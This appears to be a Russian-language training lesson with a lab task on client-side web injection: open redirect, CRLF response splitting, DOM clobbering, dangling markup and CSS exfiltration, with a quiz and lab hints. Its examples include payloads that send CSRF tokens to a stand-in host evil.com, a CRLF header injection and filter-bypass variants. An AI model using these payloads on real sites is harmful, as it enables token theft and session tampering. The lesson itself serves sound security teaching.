---
id: web-xss-client-side
title: "XSS: клиентские поверхности и инъекции разметки"
category: web
parent: web-xss
difficulty: easy
order: 1
tags: [xss, dom, css, roadmap]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 8
summary: "Клиентский уровень XSS-ветви: open redirect/CRLF, DOM clobbering, dangling markup и CSS-инъекции."
lab:
  kind: shell
  title: "Практика: open redirect как мост внутрь"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Параметр `next` управляет редиректом: `curl -sI 'https://shop.local/login?next=/profile'`."
    - "Проверь, принимает ли он чужой домен (`https://evil.com`) — увидишь `Location`."
    - "Протокол-относительный URL `//internal.shop.local/admin` ведёт на внутренний хост."
    - "Пройди по редиректу `curl -sL ...` — внутренний админ отдаст страницу с флагом. Сохрани в `found.txt` и `check`."
---

## Задача

Классический XSS — это `<script>` в HTML. Но инъекции в браузере бывают тоньше: подмена URL (open redirect, CRLF), захват DOM-переменных (clobbering), утечка через разметку (dangling markup) и кража данных через CSS. Все они работают на клиенте и часто обходят фильтры, которые ищут только теги.

Разберём четыре техники на одном сайте.

## Наш пример: страница редиректа

После входа сайт перенаправляет:

```bash
$ curl -sI 'https://shop.local/login?next=/profile' | grep -i location
Location: /profile
```

Параметр `next` управляет редиректом. Проверим, принимает ли он чужой домен:

```bash
$ curl -sI 'https://shop.local/login?next=https://evil.com' | grep -i location
Location: https://evil.com
```

Открытый редирект. Сам по себе он «низкий», но это **мост** для фишинга и обхода проверок. Копнём глубже — что если подставить управляющие символы?

## Шаг 1: CRLF-инъекция

Символы `\r\n` (%0d%0a) разделяют строки в HTTP. Если приложение вставляет их в заголовок, можно добавить свои:

```bash
$ curl -sI 'https://shop.local/login?next=%0d%0aSet-Cookie:%20admin=1' | grep -i 'set-cookie\|location'
Location: /
Set-Cookie: admin=1
```

Мы вставили новый заголовок `Set-Cookie: admin=1` через CRLF. Это **HTTP response splitting** — при достаточном контроле можно вставить целый ответ с `<script>`, то есть XSS. Работает, когда приложение отражает ввод в заголовке без фильтрации `\r\n`.

## Шаг 2: DOM clobbering — захват переменных

Клиентский JS часто обращается к глобальным объектам по id:

```javascript
// уязвимый код
let cfg = window.config || {admin:false};
if (cfg.admin) { showAdminPanel(); }
```

Если мы можем вставить HTML, создадим элемент с `id="config"` и перекроем переменную:

```html
<form id="config"><input name="admin" value="1"></form>
```

Теперь `window.config` — это форма, а `cfg.admin` — её поле `1`. Проверка `if (cfg.admin)` проходит. Это **DOM clobbering**: HTML-элемент «забивает» глобальную переменную.

## Шаг 3: dangling markup — утечка без скрипта

Иногда нельзя выполнить JS, но можно вставить незакрытую разметку. Она «повиснет» и захватит последующий HTML, включая CSRF-токены:

```html
<img src='https://evil.com/collect?'
```

Всё, что идёт дальше до следующей кавычки, станет частью URL картинки и уйдёт нам:

```html
<img src='https://evil.com/collect?' ... value='TOKEN_ABC123'>
```

`TOKEN_ABC123` — это **dangling markup injection**. Скрипт не нужен, утечка идёт через атрибут.

## Шаг 4: CSS-инъекция — кража по символам

Если ввод попадает в CSS, можно украсть значения по буквам, используя селекторы атрибутов и фоновые запросы:

```css
input[value^="a"] { background: url(https://evil.com/leak?c=a); }
input[value^="ab"] { background: url(https://evil.com/leak?c=ab); }
```

Загружая шрифты/фоны, браузер сообщает нам префикс значения. Перебирая символы, вытягивают CSRF-токен или пароль из поля. Это **CSS injection / CSS exfiltration**.

## Шаг 5: как искать клиентские поверхности

- **Редиректы:** параметры `next`, `url`, `return`, `redirect` — пробуй чужой домен.
- **CRLF:** подставь `%0d%0a` и смотри новые заголовки в ответе.
- **Clobbering:** ищи `window.X`/`document.X` в JS и создавай элементы с этим id.
- **Dangling markup:** если теги не исполняются, но вставляются — пробуй незакрытый атрибут.
- **CSS:** найди места, где ввод попадает в `<style>` или атрибут `style`.

## Если не сработало

- **Редирект только на свой домен** — ищи обход (`//evil.com`, `@evil.com`, `\t`).
- **CRLF вырезан** — попробуй `%0d%0a` двойным кодированием, `%E5%98%8A`.
- **Clobbering не проходит** — нужен элемент с нужным id и `name`; проверь, какой именно объект.
- **CSS не отражается** — ищи другой контекст (`srcdoc`, SVG).

## Что мы теперь знаем

- Open redirect — мост, а с CRLF превращается в response splitting и XSS.
- DOM clobbering перекрывает глобальные переменные HTML-элементом.
- Dangling markup ворует разметку (токены) без скрипта.
- CSS-инъекция вытягивает значения по символам через фоновые запросы.

## Частые вопросы

**Open redirect — это серьёзно?** Сам по себе «низкий», но это **мост**: фишинг с доверенного домена, обход проверок, связка с CRLF для XSS. В цепочке он усиливает другие баги.

**Чем response splitting отличается от обычного CRLF?** CRLF-инъекция добавляет заголовок; response splitting при достаточном контроле вставляет **целый ответ** со скриптом — это уже XSS.

**DOM clobbering требует XSS?** Нет: достаточно вставить HTML (например, через `innerHTML`), чтобы перекрыть глобальную переменную. Скрипт исполняет сам сайт.

**Dangling markup опасен без JavaScript?** Да, и в этом его сила: незакрытая разметка «захватывает» последующий HTML (токены) и отправляет на наш сервер.

**CSS-инъекция реально крадёт данные?** Да, посимвольно: селекторы `[value^="a"]` с фоновыми запросами вытягивают значения поля.

**Как это искать?** Смотри, куда попадает ввод: URL (редирект), заголовки (CRLF), DOM (clobbering), разметка (dangling), стили (CSS).

## Ещё один сценарий: CSS-эксфильтрация токена

Разберём CSS-инъекцию до конца. Ввод попадает в атрибут `style`:

```bash
$ curl -s 'https://shop.local/profile?theme=color:red' | grep -o 'style="color:red"'
style="color:red"
```

Мы можем вставить CSS-правила и селекторы. Если на странице есть скрытый CSRF-токен в `<input value="...">`, ворвём его посимвольно:

```css
input[name=csrf][value^="a"]  { background:url(//evil.com/?a); }
input[name=csrf][value^="ab"] { background:url(//evil.com/?ab); }
```

Загружая фон, браузер сообщает нам префикс. Перебирая символы, восстанавливаем токен целиком:

```
evil.com: /?a  /?ab  /?abc  /?abcd ...
```

Скрипт не нужен — утечка идёт через CSS.

## На что смотреть дальше

- **Редиректы.** `next`, `url`, `return` — чужой домен.
- **CRLF.** `%0d%0a` → новый заголовок или целый ответ.
- **Clobbering.** `window.X`/`document.X` и элементы с этим id.
- **Dangling markup.** Незакрытый атрибут захватывает токены.
- **CSS.** Ввод в `<style>`/`style=` → посимвольная кража.
- **Контексты.** HTML, атрибут, JS-строка, URL — payload под контекст.

## Квиз

Проверь себя.

```quiz
- question: "Что такое open redirect?"
  options:
    - "Редирект на произвольный домен из параметра URL"
    - "Чтение файла"
    - "Подмена JWT"
    - "Инъекция SQL"
  answer: 0
  explanation: "Параметр next/url управляет Location и может вести на чужой домен."
- question: "Как CRLF-инъекция приводит к XSS?"
  options:
    - "Через response splitting: добавляем свои заголовки/тело ответа"
    - "Через UNION SELECT"
    - "Через ../"
    - "Через gopher"
  answer: 0
  explanation: "Управляющие \\r\\n позволяют вставить новый заголовок или целый ответ со скриптом."
- question: "Что делает DOM clobbering?"
  options:
    - "HTML-элемент с нужным id перекрывает глобальную переменную в JS"
    - "Удаляет cookie"
    - "Шифрует DOM"
    - "Меняет метод HTTP"
  answer: 0
  explanation: "Например, форма с id=config становится window.config, подменяя объект."
- question: "Почему dangling markup опасен без JavaScript?"
  options:
    - "Незакрытая разметка захватывает последующий HTML, включая токены"
    - "Он запускает скрипт"
    - "Он читает файлы"
    - "Он подделывает JWT"
  answer: 0
  explanation: "Все данные до закрывающей кавычки уходят в URL внешнего ресурса."
```

## Куда дальше

В `web-xss-bypass-advanced` разберём обход CSP, prototype pollution, mXSS и CSTI. А пока главное запомни: **XSS — не только теги; инъекция живёт в URL, DOM, разметке и CSS.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
